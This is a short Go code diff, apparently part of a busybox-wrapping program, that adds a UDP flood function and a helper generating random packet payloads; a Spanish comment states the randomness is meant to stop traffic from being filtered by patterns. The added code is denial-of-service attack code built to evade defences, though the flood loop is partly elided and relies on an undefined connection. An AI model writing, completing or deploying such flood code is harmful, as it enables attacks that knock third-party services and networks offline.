@@ -839,3 +839,18 @@ func main() {
 		systemExec(false, "busybox", os.Args[1:])
 	}
 }
+// Genera datos aleatorios para que el tráfico no sea filtrable por patrones
+func randomPayload(size int) []byte {
+    payload := make([]byte, size)
+    rand.Read(payload) // Requiere importar "crypto/rand"
+    return payload
+}
+
+func udpFlood(target string) {
+    // ... lógica anterior ...
+    for {
+        packet := randomPayload(1024) // Cada paquete es único [L]
+        _, err := connection.Write(packet)
+        if err != nil { break }
+    }
+}
